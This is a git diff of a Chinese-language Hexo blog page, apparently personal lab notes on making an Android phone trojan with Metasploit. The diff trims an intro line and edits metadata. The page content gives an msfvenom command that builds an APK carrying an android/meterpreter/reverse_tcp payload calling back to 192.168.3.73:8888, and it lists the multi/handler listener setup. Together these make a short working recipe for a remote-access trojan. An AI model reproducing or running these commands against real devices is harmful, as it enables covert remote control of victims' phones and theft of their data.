@@ -35,21 +35,21 @@
 <link rel="canonical" href="http://yoursite.com/2019/08/26/msfconsole手机木马/">
 
 
-<meta name="description" content="前两天装了系统，看着大佬的笔记玩了一下这个东西，还是要记录一下的。 生成手机apk木马msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.3.73 LPORT=8888 R&amp;gt;1.apk  攻击模块设置use exploit/multi/handler set payload android/meterpreter/reverse">
+<meta name="description" content="生成手机apk木马msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.3.73 LPORT=8888 R&amp;gt;1.apk  攻击模块设置use exploit/multi/handler set payload android/meterpreter/reverse_tcp set LHOST 192.168.3.73 set LP">
 <meta name="keywords" content="kali">
 <meta property="og:type" content="article">
 <meta property="og:title" content="msfconsole手机木马">
 <meta property="og:url" content="http://yoursite.com/2019/08/26/msfconsole手机木马/index.html">
 <meta property="og:site_name" content="Hades">
-<meta property="og:description" content="前两天装了系统，看着大佬的笔记玩了一下这个东西，还是要记录一下的。 生成手机apk木马msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.3.73 LPORT=8888 R&amp;gt;1.apk  攻击模块设置use exploit/multi/handler set payload android/meterpreter/reverse">
+<meta property="og:description" content="生成手机apk木马msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.3.73 LPORT=8888 R&amp;gt;1.apk  攻击模块设置use exploit/multi/handler set payload android/meterpreter/reverse_tcp set LHOST 192.168.3.73 set LP">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/%28%7B0$15%5B$OKQJZOBVWCLQ_%60M.png">
 <meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/BMP6%5B%288K7$U2LSUN@NYT_%252.png">
 <meta property="og:image" content="http://pw5q6scnw.bkt.clouddn.com/Screenshot_2019-08-26-12-25-37-509_com.miui.packa.png">
-<meta property="og:updated_time" content="2019-08-26T04:43:57.618Z">
+<meta property="og:updated_time" content="2019-08-26T11:17:18.943Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="msfconsole手机木马">
-<meta name="twitter:description" content="前两天装了系统，看着大佬的笔记玩了一下这个东西，还是要记录一下的。 生成手机apk木马msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.3.73 LPORT=8888 R&amp;gt;1.apk  攻击模块设置use exploit/multi/handler set payload android/meterpreter/reverse">
+<meta name="twitter:description" content="生成手机apk木马msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.3.73 LPORT=8888 R&amp;gt;1.apk  攻击模块设置use exploit/multi/handler set payload android/meterpreter/reverse_tcp set LHOST 192.168.3.73 set LP">
 <meta name="twitter:image" content="http://pw5q6scnw.bkt.clouddn.com/%28%7B0$15%5B$OKQJZOBVWCLQ_%60M.png">
 
 
@@ -136,8 +136,7 @@
 
     
             <div class="post-content">
-            <p>前两天装了系统，看着大佬的笔记玩了一下这个东西，还是要记录一下的。</p>
-<h3 id="生成手机apk木马"><a href="#生成手机apk木马" class="headerlink" title="生成手机apk木马"></a>生成手机apk木马</h3><p><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.3.73 LPORT=8888 R&gt;1.apk</code></p>
+            <h3 id="生成手机apk木马"><a href="#生成手机apk木马" class="headerlink" title="生成手机apk木马"></a>生成手机apk木马</h3><p><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.3.73 LPORT=8888 R&gt;1.apk</code></p>
 <p><img src="http://pw5q6scnw.bkt.clouddn.com/%28%7B0$15%5B$OKQJZOBVWCLQ_%60M.png" alt="1"></p>
 <h3 id="攻击模块设置"><a href="#攻击模块设置" class="headerlink" title="攻击模块设置"></a>攻击模块设置</h3><p><code>use exploit/multi/handler</code></p>
 <p><code>set payload android/meterpreter/reverse_tcp</code></p>
